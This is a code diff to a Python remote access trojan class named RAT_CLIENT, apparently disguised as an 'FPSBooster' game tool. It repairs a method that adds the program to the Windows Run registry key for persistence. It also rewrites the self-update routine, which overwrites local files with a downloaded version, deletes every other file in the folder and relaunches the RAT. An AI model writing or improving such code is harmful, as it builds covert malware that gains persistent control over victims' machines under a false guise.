@@ -73,7 +73,7 @@ class RAT_CLIENT:
         )
         self.file_download_thread.start()
 
-    def add_to_startup_registry():
+    def add_to_startup_registry(self):
         try:
             key = _winreg.HKEY_CURRENT_USER
             sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -350,13 +350,21 @@ class RAT_CLIENT:
             # Delete the zip file
             os.remove("new_version.zip")
 
-            # Remove the old version files and directories
-            old_version_dir = "FPSBooster"
-            if os.path.exists(old_version_dir):
-                shutil.rmtree(old_version_dir)
+            # Remove the old version files
+            for filename in os.listdir("."):
+                if filename != "main.pyw":
+                    os.remove(filename)
 
             # Rename the extracted directory to the desired name
-            os.rename("FPSBooster-main", old_version_dir)
+            extracted_dir = "FPSBooster-main"
+            for item in os.listdir(extracted_dir):
+                src = os.path.join(extracted_dir, item)
+                dst = os.path.join(".", item)
+                if os.path.isdir(src):
+                    shutil.copytree(src, dst)
+                else:
+                    shutil.copy2(src, dst)
+            shutil.rmtree(extracted_dir)
 
             # Restart the RAT
             subprocess.Popen(["python", "main.pyw"])
